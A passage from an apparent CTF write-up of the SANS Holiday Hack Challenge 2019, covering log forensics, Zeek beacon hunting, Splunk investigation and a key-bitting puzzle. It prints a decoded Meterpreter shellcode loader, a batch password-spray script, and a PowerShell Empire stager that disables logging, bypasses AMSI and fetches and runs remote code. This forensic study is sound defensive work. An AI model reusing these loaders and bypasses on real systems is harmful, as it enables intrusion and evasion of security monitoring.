                      M/rBhoGHd6ONb3iuf1zT9wVnXGw9j3PGZ02xp+mSMHBRqA2+uX97OgxQn7BlrI5VB3YekoYFMr4JalRLdPaz7TQ/VQWbkc4QbdDk8H4PNmwHo3A91hyMRtMeaNvI0D7nWfIKRAdLGGjUMXk3e98yeNhqV5vrjUp+Dz2S8eW920HnD7mmadu4/wl8N2eZqG4yNp8uN17L4Nb7Go81DWdMHT
                      00XrdH5uaEbj6JVL3c2cO9A+zD8+CYlEDAoZ/PhC1r8rJWbOIzmmAFdoEtnBdrgYePYd3ucphqKkg7qJQkDwmDQwSjMaI4Y43ba9KFBw7g5DIF0Jg1hWS69ulKlZ0H12zDItq6uHsBFqJs9tQtdEnhini9uy8UiNPfitlKEEH8/ripfJcrBVj6dDikwz8bZ3riaVlTONd/q1v8K2bGO5/D
                      P+TVk3/Z+cfpbMBbz+4B/2P1+448Q/dOw7zEVIGhBD2LkMAFfi/7IjRdfB/uMQObd45N+293G4uIGvhrOTv8BxRZ9dEQKAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```

If we unencode and decompress this payload, we get the following:
```
function a2T {
	Param ($ic6T, $ylqn)		
	$cL = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $cL.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($cL.GetMethod('GetModuleHandle')).Invoke($null, @($ic6T)))), $ylqn))
}

function iq {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $jd,
		[Parameter(Position = 1)] [Type] $v2a = [Void]
	)
	
	$mSSG = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$mSSG.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $jd).SetImplementationFlags('Runtime, Managed')
	$mSSG.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $v2a, $jd).SetImplementationFlags('Runtime, Managed')
	
	return $mSSG.CreateType()
}

[Byte[]]$s2Tyx = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
		
$coU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a2T kernel32.dll VirtualAlloc), (iq @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $s2Tyx.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($s2Tyx, 0, $coU, $s2Tyx.length)

$fM51S = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a2T kernel32.dll CreateThread), (iq @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$coU,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((a2T kernel32.dll WaitForSingleObject), (iq @([IntPtr], [Int32]))).Invoke($fM51S,0xffffffff) | Out-Null
```

While this is intentionally obscure and hard to read, the simple explaination is that the encoded binary stored in _$s@Tyx_ is loaded into memory and executed. The executed buffer's hash [corresponds to known meterpreter](https://www.virustotal.com/gui/file/9c868c18e5df2928723c065c73f1590fb948ef980f395630632929dc963c8bc3/detection).

This process of initial entry was repeated four times within the logs, most likely do the crashing or termination of the existing connection. The second instance, with PowerShell PID of 4056 is the most interesting. It spawned "cmd.exe", which then spawned the following: 
```
net  use \\127.0.0.1\IPC$ /user:ELFU\Administrator ???Summer2019
net  use \\127.0.0.1\IPC$ /user:ELFU\bbrandyleaves ???Summer2019
net  use \\127.0.0.1\IPC$ /user:ELFU\bevergreen ???Summer2019
...
net  use \\127.0.0.1\IPC$ /user:ELFU\Administrator Natalie1
net  use \\127.0.0.1\IPC$ /user:ELFU\bbrandyleaves Natalie1
net  use \\127.0.0.1\IPC$ /user:ELFU\bevergreen Natalie1
...
```

This is a [password spray](https://doubleoctopus.com/security-wiki/threats-and-tools/password-spraying/) attack, where the attacker used a small list of passwords on every account in the domain, in hopes of finding valid credentials. To be precise, they used a [Batch script password spray](https://www.blackhillsinfosec.com/check-your-tools/) that looks similar to the following:
```
@FOR /F %p in (password.txt) DO
  @FOR /F %n in (users.txt) DO
    @net use \\dc1\IPC$ %p /user:CORP\%n 1>NUL 2>&1
      && echo [*] %n:%p
      && @net use /delete \\dc1\IPC$ > NUL
```

To wrap it all up, we discovered the following:
 1. The attacker gained initial access to this machine using PSExec. This means that they had legimate credentials.
 2. They utilized the Meterpreter payload, which connected back to a box they control at 192.168.86.128 on port 4444.
 3. Inside of a command prompt, they ran a script to conduct an unsucessful password spray attack
 4. Most likely, the used the Meterpreter [migrate module](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/#migrate) to run as if they were lsass.exe.
 5. The attacker then used ntdsutil.exe to create a copy of the AD Database


### Network Log Analysis: Determine Compromised System
>The attacks don't stop! Can you help identify the IP address of the malware-infected system using these [Zeek logs](https://downloads.elfu.org/elfu-zeeklogs.zip)? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry.

As with the previous challenge, I will be doing this a little different than I usually would. Rather than using [zeekcut](https://github.com/zeek/zeek-aux/tree/master/zeek-cut), a utility made for reading Zeek logs, I will try to find the infected system using built-in Bash utilities.

Or, at least, that was my intent. After viewing the contents of the ZIP, I noticed that it contains a static website in the _ELFU_ folder that displays the result of a [RITA](https://github.com/activecm/rita) analysis. 

Looking at the "Beacons" tab, we see the following:
```
0.998	192.168.134.130	144.202.46.214	7660	1156.000	10	683	10	563	0.000	0.000
```

In order, the columns have the following significance:
 * Score - A degree of certainty that it is, in fact, a beacon that was observed
 * Source - Source IP
 * Destinination - Destination IP
 * Connections - Number of connections
 * Avg. Bytes - Average size of the connection
 * Intvl. Range - Maximum interval minus minimum interval
 * Size Range - Maximum size minus minimum size
 * Intvl. Mode - Average time between packets
 * Size Mode - Average packet size
 * Interval Skew - Measurement of deviation from the average interval
 * Size Skew - Measurement of deviation from the average size

Even with no other information, this is definitely a beacon due to the score. The reason that this scored so highly is because the connections are extremely regular, occuring precisely every 10 seconds, and always have the exact same packet size. This does not, however, necessarily mean that it is malware. To confirm this, I searched the DNS logs for the destination IP:
```
micrictor@linux:/elfu-zeeklogs$ cat dns.log* | grep 144\.202\.46\.214
micrictor@linux:/elfu-zeeklogs$
```

Nothing. This is another confirming indicator that this is a malicious beacon, as most legitimate traffic will use DNS to resolve an IP. Pivoting to the HTTP logs, we get the following:
```
192.168.134.130 2152 144.202.46.214 80 POST 144.202.46.214 /504vsa/server/vssvc.php
```

Googling the requested URI leads us to [this post by BHIS](https://www.blackhillsinfosec.com/504-vsagent-usage-instructions/), outlining the usage of VSAgent for C2. This is essentially a confirmation that this is the IP we are looking for, validated by submission to the game interface.


### Splunk
>Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.

Unfortunately for me, the first time I was doing this challenge was on a corporate network, and the security policies in-place did not allow me to use the chat hints system. Because of this, I might not have the answers to each of the questions posed.

To start with, I talked to Professor Banas, as directed by the challenge. He said:
>Hi, I'm Dr. Banas, professor of Cheerology at Elf University.
This term, I'm teaching "HOL 404: The Search for Holiday Cheer in Popular Culture," and I've had quite a shock!
I was at home enjoying a nice cup of Gløgg when I had a call from Kent, one of my students who interns at the Elf U SOC.
Kent said that my computer has been hacking other computers on campus and that I needed to fix it ASAP!
If I don't, he will have to report the incident to the boss of the SOC.
Apparently, I can find out more information from this website https://splunk.elfu.org/ with the username: elf / Password: elfsocks.
I don't know anything about computer security. Can you please help me?

Now, before doing anything else, it's generally a good idea to get an idea of what logs you have available. The following query will output a nice table of the types of logs you have access to:
```
* | top sourcetype
```
With this, we get the following log types:
```
stream:ip	
stream:dns
stream:tcp
stream:udp
WinEventLog:Microsoft-Windows-Powershell/Operational
XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
WinEventLog
stream:http
stream:arp
stoq
```
To summarize, we have access to the following:
 * Network stream data
 * PowerShell script-block logging
 * Sysmon logs
 * Windows Events
 * stoQ logs - [A file analysis framework](https://github.com/PUNCH-Cyber/stoq)

With the knowledge that the attack originated from the professors laptop, we can look for the hostname of his laptop by simply searching for his name, "banas". This search told us that is workstation is named "sweetums.elfu.org", and that its ip is "172.16.134.169".


Using this information, I queried for ProcessCreate events, which are EventID 1 for Sysmon and 4688 for Windows Audit Logs, with the following query:
```
(EventCode=4688 AND ComputerName="sweetums.elfu.org") OR (EventCode=1 AND Computer="sweetums.elfu.org")
```

While this does significantly reduce the number of logs I have to look at, it is still a lot to work through. Using the _rename_ [search-time transform](https://docs.splunk.com/Documentation/Splunk/8.0.1/SearchReference/Rename), I can effectively view the rare process command lines with the following query:
```
(EventCode=4688 AND ComputerName="sweetums.elfu.org") OR (EventCode=1 AND Computer="sweetums.elfu.org") | rename Process_Command_Line as CommandLine | rare CommandLine
```

The second entry immediately jumps out to me, as it matches a common exploitation method:
```
2	"C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm" 
```

This file is suspicious for two reason. First, why was it delivered inside of a zip archive? That is not normal behaviour for a student. Second, why is it a [macro-enabled docm file](https://blog.trendmicro.com/trendlabs-security-intelligence/macro-enabled-files-found-carrying-zbot/) and not the usual doc or docx? In my experience, the vast majority of macros in word documents are malicious.

In order to look for what exactly this file was designed to do, I pivoted to the stoQ logs. The following query had one result, which contained the information I was after:
```
"19th Century Holiday Cheer Assignment.docm" sourcetype=stoq
```

The discovered log, however, was not handled extremely well by Splunk. Because stoQ outputs the results of a job as a JSON array, the log fields are, in fact, a list of fields. For example, "results{}.payload_meta.extra_data.filename" has the following values:
```
1574356658.Vca01I45e44M667617.ip-172-31-47-72	
Buttercups_HOL404_assignment.zip	
19th Century Holiday Cheer Assignment.docm	
[Content_Types].xml	
document.xml	
styles.xml	
settings.xml	
vbaData.xml	
fontTable.xml	
webSettings.xml	
vbaProject.bin	
document.xml.rels	
vbaProject.bin.rels	
theme1.xml	
item1.xml	
itemProps1.xml	
item1.xml.rels	
.rels	
app.xml	
core.xml
```

No need to worry, however, as manually clicking through the JSON hierarchy, we can find the entry for the main .docm file:
```
{ 
  archivers: { 
    filedir: { 
      path: /home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af
    }
  }
  ...
  payload_id: 9ff27aac-22c5-4b0f-a982-db99f4324fff
  payload_meta: { 
    dispatch_to: [ 
    ]
    extra_data: { 
      filename: 19th Century Holiday Cheer Assignment.docm
    }
    should_archive: true
    should_scan: true
  }
  ...
} 
```

As indicated, the file was archived to "/home/ubuntu/archive/c/6/e/1/7/c6e175f5b8048c771b3a3fac5f3295d2032524af". Using the provided [file archive](http://elfu-soc.s3-website-us-east-1.amazonaws.com/), it is easy to locate this file and download it for analysis.


Upon downloading the file, I immediately noticed something odd. 
```
micrictor@laptop:/hh19/splunk$ ll c6e175f5b8048c771b3a3fac5f3295d2032524af
-rwxrwxrwx 1 micrictor micrictor 363 Jan 12 19:47 c6e175f5b8048c771b3a3fac5f3295d2032524af*
micrictor@laptop:/hh19/splunk$ file c6e175f5b8048c771b3a3fac5f3295d2032524af
c6e175f5b8048c771b3a3fac5f3295d2032524af: ASCII text, with very long lines
```

This file is not a docm at all! It is just flat form text, which reads:
```
Cleaned for your safety. Happy Holidays!

In the real world, This would have been a wonderful artifact for you to investigate, but it had malware in it of course so it's not posted here. Fear not! The core.xml file that was a component of this original macro-enabled Word doc is still in this File Archive thanks to stoQ. Find it and you will be a happy elf :-)
```

Following the instructions, I repeat the above methodology to find the stoQ archive path for "core.xml"
```
{
  archivers: {
    filedir: {
      path: /home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4
    } 
  }
  ...
  payload_meta: { 
    dispatch_to: [
    ]
    extra_data: {
      filename: core.xml
    }
    should_archive: true
    should_scan: true
  }
  ...
} 
```

Downloading this file from the archive, and opening it as text, gives us the following:
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <dc:title>Holiday Cheer Assignment</dc:title>
  <dc:subject>19th Century Cheer</dc:subject>
  <dc:creator>Bradly Buttercups</dc:creator>
  <cp:keywords></cp:keywords>
  <dc:description>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</dc:description>
  <cp:lastModifiedBy>Tim Edwards</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-11-19T14:54:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-11-19T17:50:00Z</dcterms:modified>
  <cp:category></cp:category>
</cp:coreProperties>
```

This makes the answer to the challenge question "Kent you are so unfair. And we were going to make you the king of the Winter Carnival."


Not quite content with merely finishing the challenge, I decided that I would further investigate the intrusion. As we already discovered, the point of origin is most likely this macro-enabled document. As such, it is highly likely that looking at logs related to the instance of Word that opened the document will tell us more. Using the process ID previously discovered, I built the following query:
```
(Creator_Process_ID=0x187c OR ProcessId=6268)
```

Note that the Windows Audit logs specify the Process ID in hexadecimal, while the Sysmon logs use decimal notation.

Using this, I discovered that the process loads the WMI module, located at "C:\Windows\SysWOW64\wbem\wmiutils.dll". Because of this, it is reasonable to assume that the second stage will involve using WMI's ability to spawn new processes. To detect this, I built the following query, as WMI process creations have a reliable parent process:
```
(Creator_Process_Name="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe" OR ParentProcessName="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe")
```

This yielded one process creation, detected by Windows Audit logs, with the following command line:
```
powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBKAG8AcgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBCAGwAeQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAE8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUAbgBlAFIAaQBDAC4ARABJAEMAVABJAG8ATgBBAHIAeQBbAFMAdAByAEkATgBHACwAUwB5AFMAVABFAG0ALgBPAGIAagBlAGMAVABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABTAEUAewBbAFMAQwByAEkAUABUAEIAbABPAEMASwBdAC4AIgBHAEUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAFQAVgBBAEwAVQBlACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBqAEUAYwB0ACAAQwBvAGwAbABFAGMAVABpAG8AbgBzAC4ARwBFAG4AZQByAEkAQwAuAEgAYQBzAGgAUwBlAFQAWwBzAFQAcgBJAE4ARwBdACkAKQB9AFsAUgBFAGYAXQAuAEEAUwBTAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbABVAGUAKAAkAE4AVQBsAEwALAAkAFQAcgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAdABlAE0ALgBOAGUAVAAuAFMARQBSAHYAaQBjAEUAUABvAEkAbgBUAE0AYQBOAGEARwBlAHIAXQA6ADoARQBYAFAAZQBjAFQAMQAwADAAQwBPAE4AdABJAG4AVQBlAD0AMAA7ACQAdwBjAD0ATgBFAHcALQBPAGIAagBFAEMAVAAgAFMAeQBzAFQARQBNAC4ATgBlAFQALgBXAGUAQgBDAEwAaQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBBAEQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAcgBvAFgAeQA9AFsAUwB5AFMAVABlAE0ALgBOAGUAdAAuAFcAZQBCAFIARQBRAHUARQBTAFQAXQA6ADoARABFAEYAYQBVAEwAVABXAGUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAUgBvAFgAeQAuAEMAUgBFAEQAZQBuAFQASQBBAGwAcwAgAD0AIABbAFMAeQBTAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAGUATgBUAGkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAGUARgBhAHUAbABUAE4AZQBUAHcATwBSAGsAQwBSAEUARABlAG4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAeAB0AC4ARQBuAGMATwBkAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcAegBkACEAUABtAHcAMwBKAC8AcQBuAHUAVwBvAEgAWAB+AD0AZwAuAHsAPgBwACwARwBFAF0AOgB8ACMATQBSACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA0ADQALgAyADAAMgAuADQANgAuADIAMQA0ADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAVwBDAC4ASABFAEEARABFAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AcgBlAFQAOQBYAFEAQQBsADAARQBNAEoAbgB4AHUAawBFAFoAeQAvADcATQBTADcAMABYADQAPQAiACkAOwAkAEQAQQBUAGEAPQAkAFcAQwAuAEQAbwB3AG4AbABPAEEARABEAEEAdABBACgAJABzAEUAcgArACQAVAApADsAJABJAHYAPQAkAEQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAEQAYQB0AEEALgBsAEUATgBHAHQASABdADsALQBKAE8ASQBOAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```

Base64 encoded PowerShell is pretty much never good, and this is no exception, with the result of decoding being:
```PowerShell
IF($PSVerSioNTaBLe.PSVERsIOn.MAJor -gE 3)
{
  $GPF=[Ref].ASsEMBly.GETTyPE('System.Management.Automation.Utils')."GEtFiE`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static';
  
  IF($GPF)
  {
    $GPC=$GPF.GeTVAluE($nUlL);
    If($GPC['ScriptB'+'lockLogging'])
    {
      $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
      $GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
    }
    $val=[COLlEcTioNs.GEneRiC.DICTIoNAry[StrING,SySTEm.ObjecT]]::NeW();
    $vAl.AdD('EnableScriptB'+'lockLogging',0);
    $vaL.ADd('EnableScriptBlockInvocationLogging',0);
    $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAl
  } ElSE { 
    [SCrIPTBlOCK]."GEtFIe`lD"('signatures','N'+'onPublic,Static').SETVALUe($NUll,(NEW-OBjEct CollEcTions.GEnerIC.HashSeT[sTrING])
  }
  [REf].ASSEMBlY.GETTYPe('System.Management.Automation.AmsiUtils')| ?{$_} | %{$_.GETFielD('amsiInitFailed','NonPublic,Static').SEtValUe($NUlL,$True)};
}
[SySteM.NeT.SERvicEPoInTMaNaGer]::EXPecT100CONtInUe=0;$wc=NEw-ObjECT SysTEM.NeT.WeBCLiENT;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$wC.HEADErS.ADd('User-Agent',$u);
$Wc.ProXy=[SySTeM.Net.WeBREQuEST]::DEFaULTWebProXy;$WC.PRoXy.CREDenTIAls = [SySTEm.NET.CRedeNTiAlCAcHe]::DeFaulTNeTwORkCREDenTiALS;
$Script:Proxy = $wc.Proxy;
$K=[SySTEM.Text.EncOdING]::ASCII.GeTBYteS('zd!Pmw3J/qnuWoHX~=g.{>p,GE]:|#MR');
$R= { $D,$K=$ARGs;
    $S=0..255;0..255 | %{ $J=($J+$S[$_]+$K[$_%$K.COUnt])%256; $S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXoR$S[($S[$I]+$S[$H])%256]}}
    ;$ser='http://144.202.46.214:8080';
    $t='/admin/get.php';
    $WC.HEADErs.Add("Cookie","session=reT9XQAl0EMJnxukEZy/7MS70X4=");
    $DATa=$WC.DownlOADDAtA($sEr+$T);
    $Iv=$DatA[0..3];
    $DatA=$dATa[4..$DatA.lENGtH];
    -JOIN[ChaR[]](& $R $DatA ($IV+$K)) | IEX
```

I don't know what it says about how me, but I can immediately identify this as [PowerShell Empire](https://github.com/EmpireProject/Empire) by the characteristic [disabling of ScriptBlock logging](https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http.py#L281). From this sample, we now have the following indicators of compromise:
 * IP 144.202.46.214
 * Port 8080 HTTP traffic
 * /admin/get.php URI

This is, however, only the first stage of the attack, as indicated by the result of the HTTP request being decrypted then piped into [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7). As such, we will now look for child processes of this process, using the same query style as before.
```
(Process_ID=0x16e8 OR ProcessId=5864) 
```

Notably, this process has:
 * Installed or modified a root certificate
 * Downloaded a copy of [NMAP](https://nmap.org) to "C:\Windows\Temp\nmap.zip"

This is, however, where the forensic evidence ends. I believe that we have an appropriate amount of information, though. We know that:
 1. Initial access was obtained by emailing Professor Banas a malicious word document
 2. This document was sent from "bradley.buttercups@eifu.org," likely intended to typosquat elfu.org
 3. The document used WMI to execute a PowerShell Empire payload
 4. This payload connected to 144.202.46.214 over port 8080, using HTTP
 5. Follow-on actions included the modification of the root certificate store and the download of NMAP.




### Access Steam Tunnels
As the prompt indicates, the best starting point is looking back at the hint given by Minty [after we beat Holiday Hack Trail](#holiday-hack-trail). Following her guidance, I walked into her dorm room to take a look around.

Per her hint, I took a look at the Network tab of my in-browser developer tools, quickly identifying a picture of a fellow named [Krampus](https://en.wikipedia.org/wiki/Krampus). 

If you were not aware, traditional keys are made based on [bitting systems](https://www.locksmithledger.com/keys-tools/article/10323366/masterkeying-by-the-numbers), where the key can be expressed as a series of numbers, typically 0-9, representing the depth of the groove in the key. Given the key on Krampus, I deduced that the bitting is "122620." Inputting this into the key grinder results in a downloadable picture of the key described by that bitting. This picture can then be uploaded to the lock in the closet.

Unfortunately for me, "122620" was not the correct bitting. Upon further inspection, I overestimated how deep the fourth pin is. The correct bitting is "122520." Uploading this key to the lock results in the trapdoor sliding open, with the message "THIS IS IT --->" in red on the wall.


Being a fan of making bad decisions, I followed the big red arrow.

At the end of the hallway is Krampus, the man who's key we just copied. He admits to stealing the turtle doves, but insists that it was for a good cause:
>Hello there! I’m Krampus Hollyfeld.
>I maintain the steam tunnels underneath Elf U,
>Keeping all the elves warm and jolly.
>Though I spend my time in the tunnels and smoke,
>In this whole wide world, there's no happier bloke!
>Yes, I borrowed Santa’s turtle doves for just a bit.
>Someone left some scraps of paper near that fireplace, which is a big fire hazard.
>I sent the turtle doves to fetch the paper scraps.
>But, before I can tell you more, I need to know that I can trust you.


### Bypass Frido Sleigh CAPTEHA
>Tell you what – if you can help me beat the Frido Sleigh contest (Objective 8), then I'll know I can trust you.
